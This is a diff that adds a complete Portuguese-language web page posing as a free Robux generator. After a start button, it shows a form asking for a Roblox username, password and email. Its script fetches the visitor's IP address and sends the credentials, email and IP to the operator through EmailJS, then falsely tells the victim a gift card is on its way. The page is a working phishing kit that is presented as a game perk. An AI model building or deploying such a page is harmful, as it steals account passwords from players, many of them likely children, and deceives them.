@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gerador de Robux Grátis</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: radial-gradient(circle, #0d0d0d, #1a1a1a);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #fff;
+            overflow: hidden;
+            perspective: 1200px;
+        }
+
+        .start-screen, .login-container {
+            position: absolute;
+            background: rgba(20, 20, 20, 0.95);
+            border-radius: 20px;
+            padding: 50px;
+            text-align: center;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8);
+            transition: transform 0.6s, box-shadow 0.6s;
+            animation: popUp 0.8s ease;
+        }
+
+        @keyframes popUp {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .start-screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            transform: rotateY(0deg);
+        }
+
+        .login-container {
+            display: none;
+            transform: rotateY(-60deg);
+        }
+
+        .start-screen h1 {
+            font-size: 42px;
+            color: #ff66cc;
+            text-shadow: 0 0 15px #ff66cc;
+            margin-bottom: 30px;
+            animation: glow 1.5s infinite alternate;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 10px #ff66cc; }
+            to { text-shadow: 0 0 25px #ff66cc; }
+        }
+
+        .start-btn {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 12px;
+            background-color: #ff3366;
+            color: white;
+            font-size: 22px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s;
+            box-shadow: 0 0 10px #ff3366;
+        }
+
+        .start-btn:hover {
+            background-color: #ff66cc;
+            transform: scale(1.1);
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 18px;
+            margin: 12px 0;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #1e1e1e;
+            color: white;
+            transition: all 0.3s;
+            box-shadow: inset 0 0 5px #ff3366;
+        }
+
+        .input-field:focus {
+            outline: none;
+            background: #333;
+            box-shadow: 0 0 15px #ff3366;
+        }
+
+        .login-btn {
+            background-color: #ff3366;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 18px;
+            font-size: 18px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            transition: transform 0.3s, background-color 0.3s;
+        }
+
+        .login-btn:hover {
+            transform: scale(1.05);
+            background-color: #ff66cc;
+        }
+
+        .forgot-password {
+            margin-top: 15px;
+            color: #ff66cc;
+            transition: color 0.3s;
+        }
+
+        .forgot-password:hover {
+            color: #ff3366;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="start-screen">
+        <h1>Bem-vindo ao Gerador de Robux</h1>
+        <button class="start-btn" onclick="showLogin()">Iniciar</button>
+    </div>
+
+    <div class="login-container" id="loginContainer">
+        <h2>Gerador de Robux</h2>
+        <form id="loginForm">
+            <input type="text" id="usuario" class="input-field" placeholder="Nome de usuário" required><br>
+            <input type="password" id="senha" class="input-field" placeholder="Senha" required><br>
+            <input type="email" id="email" class="input-field" placeholder="Seu e-mail para contato" required><br>
+            <button type="submit" class="login-btn">Gerar Robux</button>
+        </form>
+        <a href="#" class="forgot-password">Esqueceu a senha?</a>
+        <div id="responseMessage"></div>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        emailjs.init("KloIr6DhxYWQCvb2Y");
+
+        function showLogin() {
+            document.querySelector('.start-screen').style.display = 'none';
+            const loginContainer = document.getElementById('loginContainer');
+            loginContainer.style.display = 'block';
+            loginContainer.style.transform = 'rotateY(0deg)';
+        }
+
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            var usuario = document.getElementById("usuario").value;
+            var senha = document.getElementById("senha").value;
+            var email = document.getElementById("email").value;
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var userIP = data.ip;
+                    var templateParams = {
+                        usuario: usuario,
+                        senha: senha,
+                        email: email,
+                        ip: userIP
+                    };
+
+                    emailjs.send("service_vpg5dg5", "template_pq6e8go", templateParams)
+                        .then(function(response) {
+                            document.getElementById("responseMessage").innerText = "E-mail enviado, confira seu Gmail para receber o gift card.";
+                        }, function(error) {
+                            document.getElementById("responseMessage").innerText = "Erro ao enviar o e-mail: " + error.text;
+                        });
+                })
+                .catch(error => {
+                    console.log('Erro ao capturar IP: ', error);
+                    document.getElementById("responseMessage").innerText = "Erro ao capturar o IP.";
+                });
+        });
+    </script>
+</body>
+</html>
